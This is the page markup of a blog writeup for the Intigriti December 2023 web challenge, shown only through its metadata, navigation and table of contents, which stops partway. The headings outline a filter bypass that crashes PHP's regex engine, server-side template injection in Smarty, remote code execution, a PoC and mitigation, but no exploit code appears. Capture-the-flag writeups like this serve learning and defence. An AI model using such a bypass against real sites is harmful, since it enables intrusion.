<!doctype html><html lang=en dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=false><head><meta charset=utf-8><meta http-equiv=content-language content="en"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><title>Intigriti Monthly Challenge 1223 &#183; simonedimaria's blog</title>
<meta name=title content="Intigriti Monthly Challenge 1223 &#183; simonedimaria's blog"><meta name=description content="Writeup for Intigriti December Challenge (1223)"><meta name=keywords content="ReDoS,SSTI,RCE,Smarty,PHP,PCRE preg_match,"><link rel=canonical href=https://simonedimaria.github.io/posts/intigriti-challenges/1223/><link type=text/css rel=stylesheet href=/css/main.bundle.min.1202079f341d659aed403bcef044aad99bed874a22efa5b3ad2bed4f1e3ed4a9c642278ee4e6346f304847d112438196535ea95e4eeafb074f141a8b1a9425f4.css integrity="sha512-EgIHnzQdZZrtQDvO8ESq2Zvth0oi76WzrSvtTx4+1KnGQieO5OY0bzBIR9ESQ4GWU16pXk7q+wdPFBqLGpQl9A=="><script type=text/javascript src=/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj+e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script><script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.3ad74b33440334ca29f8801ec6dac1f314951cf580e503d49631816b48d1f28d03543275f92b651565b48045b90731f47595b1396214b8b6aa11c6990f867f7e.js integrity="sha512-OtdLM0QDNMop+IAextrB8xSVHPWA5QPUljGBa0jR8o0DVDJ1+StlFWW0gEW5BzH0dZWxOWIUuLaqEcaZD4Z/fg==" data-copy data-copied></script><script src=/lib/zoom/zoom.min.f592a181a15d2a5b042daa7f746c3721acf9063f8b6acd175d989129865a37d400ae0e85b640f9ad42cd98d1f8ad30931718cf8811abdcc5fcb264400d1a2b0c.js integrity="sha512-9ZKhgaFdKlsELap/dGw3Iaz5Bj+Las0XXZiRKYZaN9QArg6FtkD5rULNmNH4rTCTFxjPiBGr3MX8smRADRorDA=="></script><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta property="og:url" content="https://simonedimaria.github.io/posts/intigriti-challenges/1223/"><meta property="og:site_name" content="simonedimaria's blog"><meta property="og:title" content="Intigriti Monthly Challenge 1223"><meta property="og:description" content="Writeup for Intigriti December Challenge (1223)"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-12-20T00:00:00+01:00"><meta property="article:modified_time" content="2023-12-20T00:00:00+01:00"><meta property="article:tag" content="ReDoS"><meta property="article:tag" content="SSTI"><meta property="article:tag" content="RCE"><meta property="article:tag" content="Smarty"><meta property="article:tag" content="PHP"><meta property="article:tag" content="PCRE Preg_match"><meta property="og:image" content="https://simonedimaria.github.io/posts/intigriti-challenges/1223/featured_intigriti1223_banner.jpeg"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://simonedimaria.github.io/posts/intigriti-challenges/1223/featured_intigriti1223_banner.jpeg"><meta name=twitter:title content="Intigriti Monthly Challenge 1223"><meta name=twitter:description content="Writeup for Intigriti December Challenge (1223)"><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"Blog","name":"Intigriti Monthly Challenge 1223","headline":"Intigriti Monthly Challenge 1223","abstract":"Writeup for Intigriti December Challenge (1223)","inLanguage":"en","url":"https:\/\/simonedimaria.github.io\/posts\/intigriti-challenges\/1223\/","author":{"@type":"Person","name":"simonedimaria"},"copyrightYear":"2023","dateCreated":"2023-12-20T00:00:00\u002b01:00","datePublished":"2023-12-20T00:00:00\u002b01:00","dateModified":"2023-12-20T00:00:00\u002b01:00","keywords":["ReDoS","SSTI","RCE","Smarty","PHP","PCRE preg_match"],"mainEntityOfPage":"true","wordCount":"1970"}]</script><meta name=author content="simonedimaria"><link href=https://x.com/dimariasimone rel=me><link href=https://github.com/simonedimaria rel=me><script src=/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj+KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script><meta name=theme-color></head><body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a></div><div class=min-h-[148px]></div><div class="fixed inset-x-0 pl-[24px] pr-[24px]" style=z-index:100><div id=menu-blur class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom bg-neutral dark:bg-neutral-800"></div><div class="relative max-w-[64rem] ml-auto mr-auto"><div style=padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3"><div class="flex flex-1 items-center justify-between"><nav class="flex space-x-3"><a href=/ class="text-base font-medium text-gray-500 hover:text-gray-900">simonedimaria&rsquo;s blog</a></nav><nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12"><a href=/posts/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title=Blog>Blog</p></a><a href=/tags/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title=Tags>Tags</p></a><a href=https://x.com/dimariasimone target=_blank class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><span><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span></span><p class="text-base font-medium" title></p></a><a href=https://github.com/simonedimaria target=_blank class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><span><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentcolor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></span><p class="text-base font-medium" title></p></a><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title></p></a><button id=search-button aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title>
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button><div class="flex items-center"><button id=appearance-switcher aria-label="Dark mode switcher" type=button class="text-base hover:text-primary-600 dark:hover:text-primary-400"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></nav><div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12"><span></span>
<button id=search-button-mobile aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title>
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></button>
<button id=appearance-switcher-mobile aria-label="Dark mode switcher" type=button class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></div><div class="-my-2 md:hidden"><label id=menu-button class=block><div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentcolor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></div><div id=menu-wrapper style=padding-top:5px class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50"><ul class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl"><li id=menu-close-button><span class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentcolor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></span></li><li class=mt-1><a href=/posts/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title=Blog>Blog</p></a></li><li class=mt-1><a href=/tags/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title=Tags>Tags</p></a></li><li class=mt-1><a href=https://x.com/dimariasimone target=_blank class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><div><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span></div><p class="text-bg font-bg" title></p></a></li><li class=mt-1><a href=https://github.com/simonedimaria target=_blank class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><div><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentcolor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></div><p class="text-bg font-bg" title></p></a></li><li class=mt-1><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title></p></a></li></ul></div></label></div></div><script>(function(){var e=$(".main-menu"),t=window.location.pathname;e.find('a[href="'+t+'"]').each(function(e,t){$(t).children("p").addClass("active")})})()</script></div></div><script>window.addEventListener("scroll",function(){var t=window.pageYOffset||document.documentElement.scrollTop||document.body.scrollTop||0,n=document.getElementById("menu-blur");n.style.opacity=t/300})</script><div class="relative flex flex-col grow"><main id=main-content class=grow><article><header id=single_header class="mt-5 max-w-prose"><ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden"><li class=hidden><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/></a><span class="px-1 text-primary-500">/</span></li><li class=inline><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/posts/>Blog</a><span class="px-1 text-primary-500">/</span></li><li class=hidden><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/posts/intigriti-challenges/1223/>Intigriti Monthly Challenge 1223</a><span class="px-1 text-primary-500">/</span></li></ol><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">Intigriti Monthly Challenge 1223</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime=2023-12-20T00:00:00+01:00>20 December 2023</time><span class="px-2 text-primary-500">&#183;</span><span>1970 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">10 mins</span><span class="px-2 text-primary-500">&#183;</span>
<script type=text/javascript src=/js/zen-mode.min.eea5245cf9244ecbdf2c150d1c8833226c1541cadf6e98f63a7c9192b1a3676df2c3ec603b14f4cfaaa53971fd9d8955640c0f405bf3de2b43ee7a5fb29ae721.js integrity="sha512-7qUkXPkkTsvfLBUNHIgzImwVQcrfbpj2OnyRkrGjZ23yw+xgOxT0z6qlOXH9nYlVZAwPQFvz3itD7npfsprnIQ=="></script><span class=mb-[2px]><span id=zen-mode-button class="text-lg hover:text-primary-500" title="Enable zen mode" data-title-i18n-disable="Enable zen mode" data-title-i18n-enable="Disable zen mode"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 50 50" width="50" height="50"><path fill="currentcolor" d="M12.980469 4C9.1204688 4 5.9804688 7.14 5.9804688 11L6 26H9.9804688V11c0-1.65 1.3400002-3 3.0000002-3H40.019531c1.66.0 3 1.35 3 3V39c0 1.65-1.34 3-3 3H29c0 1.54-.579062 2.94-1.539062 4H40.019531c3.86.0 7-3.14 7-7V11c0-3.86-3.14-7-7-7H12.980469zM7 28c-2.206.0-4 1.794-4 4V42c0 2.206 1.794 4 4 4H23c2.206.0 4-1.794 4-4V32c0-2.206-1.794-4-4-4H7zm0 4H23L23.001953 42H7V32z"/></svg></span></span></span></span></div><div class="flex flex-row flex-wrap items-center"><span style=margin-top:.5rem class=mr-2 onclick='return window.open("/categories/web/","_self"),!1'><span class=flex style=cursor:pointer><span class="bg-blue-700 rounded-full border-2 border-neutral-200 px-3 py-1 text-sm font-normal text-neutral-200 dark:border-neutral-400 dark:text-neutral-200">🌐 Web
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='return window.open("/tags/redos/","_self"),!1'><span class=flex style=cursor:pointer><span class="rounded-full border-2 border-primary-400 px-3 py-1 text-sm font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">ReDoS
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='return window.open("/tags/ssti/","_self"),!1'><span class=flex style=cursor:pointer><span class="rounded-full border-2 border-primary-400 px-3 py-1 text-sm font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">SSTI
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='return window.open("/tags/rce/","_self"),!1'><span class=flex style=cursor:pointer><span class="rounded-full border-2 border-primary-400 px-3 py-1 text-sm font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">RCE
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='return window.open("/tags/smarty/","_self"),!1'><span class=flex style=cursor:pointer><span class="rounded-full border-2 border-primary-400 px-3 py-1 text-sm font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Smarty
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='return window.open("/tags/php/","_self"),!1'><span class=flex style=cursor:pointer><span class="rounded-full border-2 border-primary-400 px-3 py-1 text-sm font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">PHP
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='return window.open("/tags/pcre-preg_match/","_self"),!1'><span class=flex style=cursor:pointer><span class="rounded-full border-2 border-primary-400 px-3 py-1 text-sm font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">PCRE Preg_match</span></span></span></div></div><div class="flex author"><img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width=96 height=96 alt=simonedimaria src=/img/gatto-stregone-ciccione_hu_69c1c100a967a305.jpeg><div class=place-self-center><div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">Author</div><div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">simonedimaria</div><div class="text-sm text-neutral-700 dark:text-neutral-400"><em>I make a bunch of electrons dance on some rock to hack stuff</em></div><div class="text-2xl sm:text-lg"><div class="flex flex-wrap text-neutral-400 dark:text-neutral-500"><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://x.com/dimariasimone target=_blank aria-label=X-Twitter rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
</span></span></a><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://github.com/simonedimaria target=_blank aria-label=Github rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentcolor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></span></a></div></div></div></div><div class=mb-5></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8"><div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]"><details open id=TOCView class="toc-right mt-0 overflow-y-scroll overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block"><summary class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#tldr>TL;DR</a></li><li><a href=#0-challenge-description>0. Challenge description</a></li><li><a href=#1-enumeration>1. Enumeration</a><ul><li><a href=#11-challenge-scenario>1.1) Challenge scenario</a></li><li><a href=#12-technologies>1.2) Technologies</a></li><li><a href=#13-source-code-analysis>1.3) Source code analysis</a></li></ul></li><li><a href=#14-regex-breakdown>1.4) Regex breakdown</a></li></ul><ul><li><a href=#21-filter-bypass-via-redos-that-causes-sigsegv-in-pcre>2.1) filter bypass via ReDoS that causes SIGSEGV in PCRE</a><ul><li><a href=#22-poc>2.2) PoC</a></li></ul></li><li><a href=#3-mitigation>3. 